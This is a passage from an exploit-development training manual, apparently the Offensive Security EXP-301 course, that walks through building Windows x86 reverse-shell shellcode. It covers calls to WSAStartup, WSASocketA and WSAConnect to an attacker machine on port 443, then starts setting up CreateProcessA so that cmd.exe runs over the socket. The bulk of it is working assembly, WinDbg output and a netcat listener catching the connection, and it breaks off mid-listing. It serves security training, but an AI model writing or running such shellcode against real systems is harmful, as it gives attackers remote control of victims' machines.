documentation. 
The second parameter is a pointer to the WSADATA243 structure. According to Microsoft, this 
structure will receive details about the Windows Sockets implementation. We need to reserve 
space for this structure, so let’s discover its length by going over its prototype and inspecting the 
size of each structure member. 
typedef struct WSAData { 
  WORD           wVersion; 
  WORD           wHighVersion; 
#if ... 
  unsigned short iMaxSockets; 
#if ... 
  unsigned short iMaxUdpDg; 
#if ... 
  char           *lpVendorInfo; 
#if ... 
  char           szDescription[WSADESCRIPTION_LEN + 1]; 
#if ... 
  char           szSystemStatus[WSASYS_STATUS_LEN + 1]; 
#else 
  char           szDescription[WSADESCRIPTION_LEN + 1]; 
#endif 
#else 
  char           szSystemStatus[WSASYS_STATUS_LEN + 1]; 
#endif 
#else 
  unsigned short iMaxSockets; 
#endif 
#else 
  unsigned short iMaxUdpDg; 
#endif 
#else 
  char           *lpVendorInfo; 
#endif 
} WSADATA; 
Listing 335 - WSADATA structure 
Reviewing the structure definition (Listing 335) and information on the Microsoft website, we note 
that some of the members are no longer used if the version is higher than “2.0”. 
While most of the fields have defined lengths, there are a couple that remain problematic such as 
the szDescription and szSystemStatus fields. According to the official documentation, 
szDescription can have a maximum length of 257 (WSADESCRIPTION_LEN, which is 256 plus the 
string NULL terminator). Unfortunately, there is no mention of the length of the szSystemStatus 
field. 
 
243 (Microsoft - WSADATA), https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
276 
There are two ways to determine the length of this field. We could code the socket in C and then 
inspect the structure inside WinDbg, or we could use online resources to determine the size of 
this field. One of the most reliable resources for such information is the source code of 
ReactOS.244 
ReactOS is an open-source operating system designed to run Windows software 
and drivers. It uses a large number of structures that come from reverse-
engineering older versions of the Windows operating system. 
The source code of ReactOS tells us that the maximum length of the szSystemStatus245 field is 
129 (WSASYS_STATUS_LEN, which is 128 plus the NULL terminator). 
While we do not know the exact size of the structure, we do know that just these two fields 
(szDescription and szSystemStatus) can occupy a maximum of 0x182 bytes. Taking into account 
the other fields of the structure, which have defined sizes, we can calculate the maximum length 
of the structure using WinDbg: 
0:002> ? 0x2 + 0x2 + 0x2 + 0x2 + 0x4 + 0n256 + 0n1 + 0n128 + 0n1 
Evaluate expression: 398 = 0000018e 
Listing 336 - Calculating the size of the WSADATA structure inside WinDbg 
Because the size of this structure is larger than the space we currently reserved on the stack as 
part of the start function, we need to modify our shellcode and subtract a higher value from ESP 
to account for the structure’s size. 
After going over the arguments we need to supply to the WSAStartup API and determining the 
size of the structure it uses, let’s update our shellcode and attempt to call it. 
import ctypes, struct 
from keystone import * 
 
CODE = ( 
    " start:                             "  # 
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN 
NOT DEBUGGING!!!! 
    "   mov   ebp, esp                  ;"  # 
    "   add   esp, 0xfffff9f0           ;"  #   Avoid NULL bytes 
... 
    " call_wsastartup:                   "  # 
    "   mov   eax, esp                  ;"  #   Move ESP to EAX 
    "   mov   cx, 0x590                 ;"  #   Move 0x590 to CX 
    "   sub   eax, ecx                  ;"  #   Subtract CX from EAX to avoid 
overwriting the structure later 
    "   push  eax                       ;"  #   Push lpWSAData 
    "   xor   eax, eax                  ;"  #   Null EAX 
 
244 (ReactOS), https://reactos.org/ 
245 (ReactOS - WSASYS_STATUS_LEN), 
https://doxygen.reactos.org/dd/d21/winsock2_8h.html#acc8153c87f4d00b6e4570c5d0493b38c 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
277 
    "   mov   ax, 0x0202                ;"  #   Move version to AX 
    "   push  eax                       ;"  #   Push wVersionRequired 
    "   call dword ptr [ebp+0x1C]       ;"  #   Call WSAStartup 
Listing 337 - reverse_shell_0x02.py: Calling the WSAStartup API 
The call_wsastartup function shown in Listing 337 begins by moving the memory address from 
ESP, which we used as a storage location for our resolved symbols, to the EAX register. 
Next we encounter a MOV instruction that stores the 0x590 value in the CX register. Then, we’ll 
find a SUB instruction that will subtract the value of ECX (0x590) from EAX, which stores the 
stack pointer. 
As part of the call to WSAStartup, the API will populate the WSADATA structure that is currently 
on the stack. Because of this, we need to ensure that later shellcode instructions do not overwrite 
the contents of this structure. One way of achieving this is by subtracting an arbitrary value 
(0x590) from the stack pointer and using that as storage for the structure. 
After the SUB operation, we’ll push EAX to the stack. The next XOR instruction will zero out EAX 
and we will move the 0x0202 value to the AX register to act as the wVersionRequired argument. 
Finally, we can push this argument to the stack and call WSAStartup. Let’s run the shellcode, 
single step through the call_wsastartup function inside WinDbg, and verify the return code after 
our call to WSAStartup. 
0:002> r 
eax=00000202 ebx=75070000 ecx=00000590 edx=00000000 esi=02970030 edi=01391ca0 
eip=029700e8 esp=02b6f670 ebp=02b6faac iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
029700e8 ff551c          call    dword ptr [ebp+1Ch]  
ss:0023:02b6fac8={WS2_32!WSAStartup (750825e0)} 
 
0:002> dds @esp L2 
02b6f670  00000202 
02b6f674  02b6f0e8 
 
0:002> p 
eax=00000000 ebx=75070000 ecx=831d218e edx=00000202 esi=02970030 edi=01391ca0 
eip=029700eb esp=02b6f678 ebp=02b6faac iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
029700eb 0000            add     byte ptr [eax],al          ds:0023:00000000=?? 
Listing 338 - Calling WSAStartup inside WinDbg 
The output from Listing 338 shows us that the return value of the function stored in EAX is 0, 
which indicates a successful call according to the official documentation. 
We’ve now learned how to initiate the Winsock DLL, so we can continue with the remaining API 
calls. 
7.6.2.1 Exercises 
1. 
Go over the official WSAStartup API documentation to make sure you understand the 
arguments it requires. 
2. 
Determine the maximum size of WSDATA using online resources and the official structure 
definition. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
278 
3. 
Update your shellcode and ensure you can successfully call the WSAStartup API. 
7.6.3 Calling WSASocket 
We now need to invoke the WSASocketA246 API, which is responsible for creating the socket. Once 
again, let’s review the function prototype: 
SOCKET WSAAPI WSASocketA( 
  int                 af, 
  int                 type, 
  int                 protocol, 
  LPWSAPROTOCOL_INFOA lpProtocolInfo, 
  GROUP               g, 
  DWORD               dwFlags 
); 
Listing 339 - The prototype of WSASocketA 
The prototype of this function (Listing 339) reveals there are six arguments required for the call. 
Most of these arguments have familiar data types such as INT and DWORD, but we’ll also find 
some odd data types within the lpProtocolInfo and g parameters that require additional review. 
We want to determine what arguments are needed by the function in our shellcode, so let’s tackle 
each parameter in order. 
We’ll start with the af parameter, which is the address family used by the socket. The official 
documentation mentions which common address families are supported by the API. Exploring 
the list, we’ll find that AF_INET (2) corresponds to the IPv4 address family. This is what our 
reverse shell will use. 
The next parameter, type, specifies the socket type as its name implies. Again, the official 
documentation offers a list of possible values for this parameter. Our reverse shell will be going 
over the Transmission Control Protocol (TCP), so we need to supply the SOCK_STREAM (1) 
argument for the socket type. 
According to the official documentation, the protocol parameter is based on the previous two 
arguments supplied to the function. In our case, it needs to be set to IPPROTO_TCP (6). 
Continuing to review the official documentation, the lpProtocolInfo parameter seems to require a 
pointer to the WSAPROTOCOL_INFO247 structure. Before we dive into this structure, it is important 
to note that this parameter can be set to NULL (0x0). If set to null, Winsock will use the first 
transport-service provider,248 which matches our other parameters. Because we are using 
standard protocols in our reverse shell (TCP/IP), we should not encounter any issues by having 
this parameter NULL. 
Next, we have the g parameter. This parameter is used for specifying a socket group ID. Since we 
are creating a single socket, we can set this value to NULL as well. 
 
246 (Microsoft - WSASocketA), https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa 
247 (Microsoft - WSAPROTOCOL_INFOA), https://docs.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-
wsaprotocol_infoa 
248 (Microsoft - Transport Service Providers), https://docs.microsoft.com/en-us/windows/win32/winsock/transport-service-providers-
2 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
279 
Finally, we reach the dwFlags parameter, which is used to specify additional socket attributes. 
Because we do not require any additional attributes for our current shellcode, we will also set this 
value to NULL. 
Now that we’re more familiar with the arguments we need to set up and pass to the API, let’s 
implement this function call in our shellcode: 
    " call_wsasocketa:                   "  # 
    "   xor   eax, eax                  ;"  #   Null EAX 
    "   push  eax                       ;"  #   Push dwFlags 
    "   push  eax                       ;"  #   Push g 
    "   push  eax                       ;"  #   Push lpProtocolInfo 
    "   mov   al, 0x06                  ;"  #   Move AL, IPPROTO_TCP 
    "   push  eax                       ;"  #   Push protocol 
    "   sub   al, 0x05                  ;"  #   Subtract 0x05 from AL, AL = 0x01 
    "   push  eax                       ;"  #   Push type 
    "   inc   eax                       ;"  #   Increase EAX, EAX = 0x02 
    "   push  eax                       ;"  #   Push af 
    "   call dword ptr [ebp+0x20]       ;"  #   Call WSASocketA 
Listing 340 - reverse_shell_0x03.py: Calling the WSASocketA API 
The code from Listing 340 starts by zeroing out EAX, and then pushing it on the stack three times. 
We push this value because the last three parameters of this API are set to NULL. We then move 
the value 0x06 into the AL register and push it onto the stack. We pass this value as the protocol 
argument of IPPROTO_TCP (6). 
This is followed by a SUB instruction, which subtracts the value 0x05 from AL. The value in AL 
becomes 0x01, matching the SOCK_STREAM (1) value that we want to pass as the type 
argument. We can then push that onto the stack. 
The address family (af) argument must be set to AF_INET (2). We’ll use the INC instruction on the 
EAX register, which currently contains the value 0x01, to increase the value by one and push it to 
the stack. 
Let’s run our updated proof of concept. After hitting our INT3 instruction, we set a breakpoint on 
the CALL to WSASocketA. After hitting our breakpoint, we’ll step over the function and inspect the 
return value: 
0:002> bp 02a500f8  
 
0:002> bl 
     0 e Disable Clear  02a500f8     0001 (0001)  0:****  
 
0:002> g 
Breakpoint 0 hit 
eax=00000002 ebx=75070000 ecx=6a720271 edx=00000202 esi=02a50030 edi=01251ca0 
eip=02a500f8 esp=02c4f9ec ebp=02c4fe38 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
02a500f8 ff5520          call    dword ptr [ebp+20h]  
ss:0023:02c4fe58={WS2_32!WSASocketA (750856d0)} 
 
0:002> dds @esp L6 
02c4f9ec  00000002 
02c4f9f0  00000001 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
280 
02c4f9f4  00000006 
02c4f9f8  00000000 
02c4f9fc  00000000 
02c4fa00  00000000 
 
0:002> p 
ModLoad: 73af0000 73b40000   C:\Windows\system32\mswsock.dll 
eax=00000180 ebx=75070000 ecx=6a720271 edx=012f4204 esi=02a50030 edi=01251ca0 
eip=02a500fb esp=02c4fa04 ebp=02c4fe38 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02a500fb 0000            add     byte ptr [eax],al          ds:0023:00000180=?? 
Listing 341 - Calling WSASocketA inside WinDbg 
The return value from Listing 341 is 0x180. The official documentation indicates that if the call is 
unsuccessful, the return value is INVALID_SOCKET249 (0xFFFF). Otherwise, the function returns a 
descriptor referencing the socket. 
We have now successfully created a socket by calling the WSASocketA API and obtained a 
descriptor referencing it in the EAX register. Next, we’ll establish a connection to our Kali machine. 
7.6.3.1 Exercises 
1. 
Using the official documentation, go over each parameter of the WSASocketA API to 
understand the arguments we are using in our shellcode. 
2. 
Update the shellcode to include the necessary instructions to call WSASocketA. 
3. 
Confirm that the call is successful using WinDbg. 
7.6.4 Calling WSAConnect 
With our socket created, we can call WSAConnect,250 which establishes a connection between 
two socket applications. As we have done for past API calls, let’s examine the function prototype: 
int WSAAPI WSAConnect( 
  SOCKET         s, 
  const sockaddr *name, 
  int            namelen, 
  LPWSABUF       lpCallerData, 
  LPWSABUF       lpCalleeData, 
  LPQOS          lpSQOS, 
  LPQOS          lpGQOS 
); 
Listing 342 - The prototype of WSAConnect 
The first parameter of the WSAConnect API is the SOCKET type, simply named s. This parameter 
requires a descriptor to an unconnected socket, which is exactly what the previous call to 
WSASocketA returned. At this point in our shellcode, that value is in the EAX register, and we will 
need to ensure we do not overwrite it. 
 
249 (Microsoft - Handling Winsock Errors), https://docs.microsoft.com/en-us/windows/win32/winsock/handling-winsock-errors 
250 (Microsoft - WSAConnect), https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
281 
Let’s move on to the second parameter, a pointer to a sockaddr251 structure. This structure varies 
depending on the protocol selected. For the IPv4 protocol, we will use the sockaddr_in252 
structure, as mentioned in the official documentation. Let’s inspect the structure definition: 
typedef struct sockaddr_in { 
#if ... 
  short          sin_family; 
#else 
  ADDRESS_FAMILY sin_family; 
#endif 
  USHORT         sin_port; 
  IN_ADDR        sin_addr; 
  CHAR           sin_zero[8]; 
} SOCKADDR_IN, *PSOCKADDR_IN; 
Listing 343 - SOCKADDR_IN structure 
The first member of the structure is sin_family, which requires the address family of the transport 
address. Official documentation directs us to ensure this value is always set to AF_INET. 
The next member is sin_port, which as the name implies, specifies the port. This is followed by 
sin_addr, a nested structure of the type IN_ADDR.253 This nested structure will store the IP address 
used to initiate the connection to. The structure definition differs based on how the IP address is 
passed. In memory, however, the structures look identical. This means we can store the IP 
address inside a DWORD, as shown below: 
typedef struct in_addr { 
  union { 
    struct { 
      UCHAR s_b1; 
      UCHAR s_b2; 
      UCHAR s_b3; 
      UCHAR s_b4; 
    } S_un_b; 
    struct { 
      USHORT s_w1; 
      USHORT s_w2; 
    } S_un_w; 
    ULONG  S_addr; 
  } S_un; 
} IN_ADDR, *PIN_ADDR, *LPIN_ADDR; 
Listing 344 - IN_ADDR structure 
The last member of the sockaddr_in structure is sin_zero, a size 8 character array. According to 
the official documentation, this array is reserved for system use, and its contents should be set to 
0. 
Now that we have discussed the sockaddr_in structure and the IN_ADDR nested structure, let’s 
take another look at the WSAConnect prototype: 
 
251 (Microsoft - sockaddr), https://docs.microsoft.com/en-us/windows/win32/winsock/sockaddr-2 
252 (Microsoft - SOCKADDR_IN), https://docs.microsoft.com/en-us/windows/win32/api/ws2def/ns-ws2def-sockaddr_in 
253 (Microsoft - IN_ADDR), https://docs.microsoft.com/en-us/previous-versions/windows/hardware/drivers/ff556972(v=vs.85) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
282 
int WSAAPI WSAConnect( 
  SOCKET         s, 
  const sockaddr *name, 
  int            namelen, 
  LPWSABUF       lpCallerData, 
  LPWSABUF       lpCalleeData, 
  LPQOS          lpSQOS, 
  LPQOS          lpGQOS 
); 
Listing 345 - The prototype of WSAConnect 
After the *name parameter, which is a pointer to the sockaddr_in structure, we need to provide the 
size of the previously-passed structure as the namelen parameter. We can calculate the size of 
sockaddr_in, which is 0x10 bytes long, using the data types from the structure definition. 
The next two parameters, lpCallerData and lpCalleeData, require pointers to user data that will be 
transferred to and from the other socket. According to the documentation, these parameters are 
used by legacy protocols and are not supported for TCP/IP. We can set both of these to be NULL. 
The lpSQOS parameter requires a pointer to the FLOWSPEC254 structure. This structure is used in 
applications that support quality of service (QoS)255 parameters. This is not the case for our 
shellcode, so we can set it to NULL. 
Lastly, the lpGQOS parameter is reserved and should be set to NULL. 
Before updating our shellcode, we need to convert the IP address and the port of our Kali machine 
to the correct format. This machine will receive the connection from our shellcode. We will use 
WinDbg while attached to the python.exe process for this conversion: 
0:002> ? 0n192 
Evaluate expression: 192 = 000000c0 
 
0:002> ? 0n168 
Evaluate expression: 168 = 000000a8 
 
0:002> ? 0n119 
Evaluate expression: 119 = 00000077 
 
0:002> ? 0n120 
Evaluate expression: 120 = 00000078 
 
0:002> ? 0n443 
Evaluate expression: 443 = 000001bb 
Listing 346 - Getting the hexadecimal representation of our IP address 
With the hex values of our IP address and port generated, we can now update our shellcode with 
the call to the WSAConnect API: 
    " call_wsaconnect:                   "  # 
    "   mov   esi, eax                  ;"  #   Move the SOCKET descriptor to ESI 
 
254 (Microsoft - FLOWSPEC), https://docs.microsoft.com/en-us/windows/win32/api/qos/ns-qos-flowspec 
255 (QoS - quality of service), https://searchunifiedcommunications.techtarget.com/definition/QoS-Quality-of-Service 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
283 
    "   xor   eax, eax                  ;"  #   Null EAX 
    "   push  eax                       ;"  #   Push sin_zero[] 
    "   push  eax                       ;"  #   Push sin_zero[] 
    "   push  0x7877a8c0                ;"  #   Push sin_addr (192.168.119.120) 
    "   mov   ax, 0xbb01                ;"  #   Move the sin_port (443) to AX 
    "   shl   eax, 0x10                 ;"  #   Left shift EAX by 0x10 bytes 
    "   add   ax, 0x02                  ;"  #   Add 0x02 (AF_INET) to AX 
    "   push  eax                       ;"  #   Push sin_port & sin_family 
    "   push  esp                       ;"  #   Push pointer to the sockaddr_in 
structure 
    "   pop   edi                       ;"  #   Store pointer to sockaddr_in in EDI 
    "   xor   eax, eax                  ;"  #   Null EAX 
    "   push  eax                       ;"  #   Push lpGQOS 
    "   push  eax                       ;"  #   Push lpSQOS 
    "   push  eax                       ;"  #   Push lpCalleeData 
    "   push  eax                       ;"  #   Push lpCalleeData 
    "   add   al, 0x10                  ;"  #   Set AL to 0x10 
    "   push  eax                       ;"  #   Push namelen 
    "   push  edi                       ;"  #   Push *name 
    "   push  esi                       ;"  #   Push s 
    "   call dword ptr [ebp+0x24]       ;"  #   Call WSASocketA 
Listing 347 - reverse_shell_0x04.py: Calling the WSAConnect API 
The call_wsaconnect function starts by saving the socket descriptor (obtained in the previous 
step) to ESI. This will only work if our instructions do not mangle ESI before the call to 
WSAConnect. 
Next, we NULL the EAX register, and then push it twice to the stack. These two PUSH instructions 
set up the sin_zero character array from the sockaddr_in structure. 
We then proceed to push a DWORD that represents the hexadecimal value of our Kali IP address. 
We’ll need to push it in reverse order due to the endian byte order. This also applies to our next 
instruction, which moves a WORD to the AX register containing the hexadecimal representation of 
our desired port (443). 
Using the SHL256 instruction, we’ll left-shift the EAX value by 0x10 bytes and then add 0x02 to the 
AX register. This is done because both the sin_port and sin_family members are defined as 
USHORT, meaning they are each two bytes long. Then we will push the resulting DWORD to the 
stack, completing the sockaddr_in structure. Next, we obtain a pointer to it using the PUSH ESP 
and POP EDI instructions to use later. 
The next instruction nulls the EAX register, and we PUSH it to the stack four times. This sets up 
the NULL arguments for our function call. 
Next, we add 0x10 to the AL register and push it on the stack as our namelen argument. Finally, 
we push the pointer to the sockaddr_in structure, stored in EDI, and the socket descriptor from 
ESI. After all the arguments have been pushed on the stack, we call the API. 
Let’s run our updated shellcode, set a breakpoint at the call to WSAConnect, and inspect the 
arguments we pass. 
 
256 (Faydoc - SHL), http://faydoc.tripod.com/cpu/shl.htm 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
284 
0:002> bp 0235011f  
 
0:002> g 
ModLoad: 73af0000 73b40000   C:\Windows\system32\mswsock.dll 
Breakpoint 0 hit 
eax=00000010 ebx=75070000 ecx=adbfb388 edx=00aed3fc esi=00000180 edi=0254f8d0 
eip=0235011f esp=0254f8b4 ebp=0254fd14 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
0235011f ff5524          call    dword ptr [ebp+24h]  
ss:0023:0254fd38={WS2_32!WSAConnect (75084d90)} 
 
0:002> dds @esp L7 
0254f8b4  00000180 
0254f8b8  0254f8d0 
0254f8bc  00000010 
0254f8c0  00000000 
0254f8c4  00000000 
0254f8c8  00000000 
0254f8cc  00000000 
 
0:002> dds 0254f8d0 L4 
0254f8d0  bb010002 
0254f8d4  7877a8c0 
0254f8d8  00000000 
0254f8dc  00000000 
Listing 348 - Inspecting the arguments passed to WSAConnect inside WinDbg 
According to the output from Listing 348, we have successfully created the sockaddr_in on the 
stack, and passed the pointer to it as a parameter to WSAConnect. The rest of the parameters 
also seem to have been pushed onto the stack correctly. 
Before stepping over the call and inspecting the return value, let’s open a Netcat listener on our 
Kali machine. Although our reverse shell is not complete yet, this API call should initiate the 
connection, and we can catch it using Netcat. If the connection is unsuccessful, the API will time 
out. 
0:002> p 
eax=00000000 ebx=75070000 ecx=adbfb388 edx=770a4550 esi=00000180 edi=0254f8d0 
eip=02350122 esp=0254f8d0 ebp=0254fd14 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
02350122 0000            add     byte ptr [eax],al          ds:0023:00000000=?? 
Listing 349 - Calling WSAConnect inside WinDbg 
After stepping over the function, we observe that the return value is 0 (Listing 349). According to 
the official documentation, this means that our call was successful. 
We can confirm that the call succeeded by switching to our Kali machine, where we should find 
Netcat receiving a connection: 
kali@kali:~$ sudo nc -lvp 443 
[sudo] password for kali:  
listening on [any] 443 ... 
192.168.119.10: inverse host lookup failed: Unknown host 
connect to [192.168.119.120] from (UNKNOWN) [192.168.120.10] 51336 
Listing 350 - Receiving a connection from our shellcode to our netcat listener 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
285 
Excellent! We’re now one step closer to creating a full reverse shell. Next, let’s determine how to 
attach a command prompt to this connection. 
7.6.4.1 Exercises 
1. 
Review the official documentation of the WSAConnect API and ensure you understand the 
arguments required to successfully call it. 
2. 
Make sure you understand the definition of the structures used in this API call and their 
members. 
3. 
Update the shellcode to include the call to WSAConnect. Pay attention when creating the 
structures on the stack, and ensure that the values are pushed in the correct order. 
4. 
Set up a Netcat listener and then run the shellcode. Ensure that you can successfully call 
WSAConnect by inspecting the return value inside WinDbg. 
5. 
Modify your shellcode to connect to your Kali machine on port 21760. 
7.6.5 Calling CreateProcessA 
Now that we have successfully initiated a connection, we need to find a way to start a cmd.exe 
process and redirect its input and output through our initiated connection. 
We’ll use the CreateProcessA257 API to, as its name suggests, create a new process. Below, we 
can examine the function prototype to better understand the required parameters: 
BOOL CreateProcessA( 
  LPCSTR                lpApplicationName, 
  LPSTR                 lpCommandLine, 
  LPSECURITY_ATTRIBUTES lpProcessAttributes, 
  LPSECURITY_ATTRIBUTES lpThreadAttributes, 
  BOOL                  bInheritHandles, 
  DWORD                 dwCreationFlags, 
  LPVOID                lpEnvironment, 
  LPCSTR                lpCurrentDirectory, 
  LPSTARTUPINFOA        lpStartupInfo, 
  LPPROCESS_INFORMATION lpProcessInformation 
); 
Listing 351 - The prototype of CreateProcessA 
The first parameter required by the API (Listing 351) is lpApplicationName. This parameter must 
contain a pointer to a string, which represents the application that will be executed. If the 
parameter is set to NULL, the second parameter (lpCommandLine) can not be NULL, and vice-
versa. This parameter expects a pointer to a string containing the command line to be executed. 
Our shellcode will use this parameter to run cmd.exe. 
Next, let’s address the lpProcessAttributes and lpThreadAttributes parameters, which require 
pointers to SECURITY_ATTRIBUTES258 type structures. For our shellcode, these parameters can 
be set to NULL. 
 
257 (Microsoft - CreateProcessA), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-
createprocessa 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
286 
The following parameter, bInheritHandles, expects a TRUE (1) or FALSE (0) value. This value 
determines if the inheritable handles259 from the Python calling process are inherited by the new 
process (cmd.exe). We’ll need to set this value to TRUE for our reverse shell, which we’ll explore in 
more detail soon. 
bInheritHandles is followed by the dwCreationFlags parameter, which expects various Process 
Creation Flags.260 If this value is NULL, the cmd.exe process will use the same flags as the calling 
process. 
The lpEnvironment parameter expects a pointer to an environment block. The official 
documentation indicates that if this parameter is set to NULL, it will share the same environment 
block as the calling process. 
lpCurrentDirectory allows us to specify the full path to the directory for the process. If we set it to 
NULL, it will use the same path as the current calling process. In our case, cmd.exe is added to 
the PATH, allowing us to launch the executable from any path. However, depending on which 
process the shellcode runs, this parameter might be required. 
The last two parameters, lpStartupInfo and lpProcessInformation, require pointers to 
STARTUPINFOA261 and PROCESS_INFORMATION262 structures. 
Because the PROCESS_INFORMATION structure will be populated as part of the API, we only need 
to know the size of the structure. On the other hand, the STARTUPINFOA structure has to be 
passed to the API by our shellcode. To do this, we’ll need to review the members of the structure 
and set them up accordingly. 
typedef struct _STARTUPINFOA { 
  DWORD  cb; 
  LPSTR  lpReserved; 
  LPSTR  lpDesktop; 
  LPSTR  lpTitle; 
  DWORD  dwX; 
  DWORD  dwY; 
  DWORD  dwXSize; 
  DWORD  dwYSize; 
  DWORD  dwXCountChars; 
  DWORD  dwYCountChars; 
  DWORD  dwFillAttribute; 
  DWORD  dwFlags; 
  WORD   wShowWindow; 
  WORD   cbReserved2; 
  LPBYTE lpReserved2; 
  HANDLE hStdInput; 
 
258 (Microsoft - SECURITY_ATTRIBUTES), https://docs.microsoft.com/en-us/previous-
versions/windows/desktop/legacy/aa379560(v=vs.85) 
259 (Microsoft - Handle Inheritance), https://docs.microsoft.com/en-us/windows/win32/sysinfo/handle-inheritance 
260 (Process Creation Flags), https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags 
261 (Microsoft - STARTUPINFOA), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-
startupinfoa 
262 (Microsoft - PROCESS_INFORMATION), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-
processthreadsapi-process_information 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
287 
  HANDLE hStdOutput; 
  HANDLE hStdError; 
} STARTUPINFOA, *LPSTARTUPINFOA; 
Listing 352 - STARTUPINFOA structure 
The official documentation shown in Listing 352 reveals that we only have to worry about a few 
members. We can set the remaining members to NULL. 
The first member we need to set is cb, which requires the size of the structure. We can easily 
calculate this value using its publicly available symbols and WinDbg: 
0:002> dt STARTUPINFOA 
MSVCR120!STARTUPINFOA 
   +0x000 cb               : Uint4B 
   +0x004 lpReserved       : Ptr32 Char 
   +0x008 lpDesktop        : Ptr32 Char 
   +0x00c lpTitle          : Ptr32 Char 
   +0x010 dwX              : Uint4B 
   +0x014 dwY              : Uint4B 
   +0x018 dwXSize          : Uint4B 
   +0x01c dwYSize          : Uint4B 
   +0x020 dwXCountChars    : Uint4B 
   +0x024 dwYCountChars    : Uint4B 
   +0x028 dwFillAttribute  : Uint4B 
   +0x02c dwFlags          : Uint4B 
   +0x030 wShowWindow      : Uint2B 
   +0x032 cbReserved2      : Uint2B 
   +0x034 lpReserved2      : Ptr32 UChar 
   +0x038 hStdInput        : Ptr32 Void 
   +0x03c hStdOutput       : Ptr32 Void 
   +0x040 hStdError        : Ptr32 Void 
    
0:002> ?? sizeof(STARTUPINFOA) 
unsigned int 0x44 
Listing 353 - Obtaining the size of the STARTUPINFOA structure 
The second member we need to worry about is dwFlags. It determines whether certain members 
of the STARTUPINFOA structure are used when the process creates a window. We’ll need to set 
this member to the STARTF_USESTDHANDLES flag to enable the hStdInput, hStdOutput, and 
hStdError members. We will examine why these members are important for our reverse shell 
shortly. 
It is worth mentioning that if this flag is specified, the handles of the calling process must be 
inheritable, and the bInheritHandles parameter must be set to TRUE. 
Because we will set the STARTF_USESTDHANDLES flag, we also need to set the members that 
this flag enables. The official documentation tells us that all of these members accept a handle, 
which receives input (hStdInput), output (hStdOutput), and error handling (hStdError). To interact 
with the cmd.exe process through our socket, we can specify the socket descriptor obtained from 
the WSASocketA API call as a handle. 
With a better understanding of the API prototype and the structures it uses, let’s inspect our 
updated shellcode. Since this API requires a large number of arguments and a large structure, we 
will break the shellcode down into a few functions: 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
288 
    " create_startupinfoa:               "  # 
    "   push  esi                       ;"  #   Push hStdError 
    "   push  esi                       ;"  #   Push hStdOutput 
    "   push  esi                       ;"  #   Push hStdInput 
    "   xor   eax, eax                  ;"  #   Null EAX    
    "   push  eax                       ;"  #   Push lpReserved2 
    "   push  eax                       ;"  #   Push cbReserved2 & wShowWindow 
    "   mov   al, 0x80                  ;"  #   Move 0x80 to AL 
    "   xor   ecx, ecx                  ;"  #   Null ECX 
    "   mov   cx, 0x80                  ;"  #   Move 0x80 to CX 
    "   add   eax, ecx                  ;"  #   Set EAX to 0x100 
    "   push  eax                       ;"  #   Push dwFlags 
    "   xor   eax, eax                  ;"  #   Null EAX    
    "   push  eax                       ;"  #   Push dwFillAttribute 
    "   push  eax                       ;"  #   Push dwYCountChars 
    "   push  eax                       ;"  #   Push dwXCountChars 
    "   push  eax                       ;"  #   Push dwYSize 
    "   push  eax                       ;"  #   Push dwXSize 
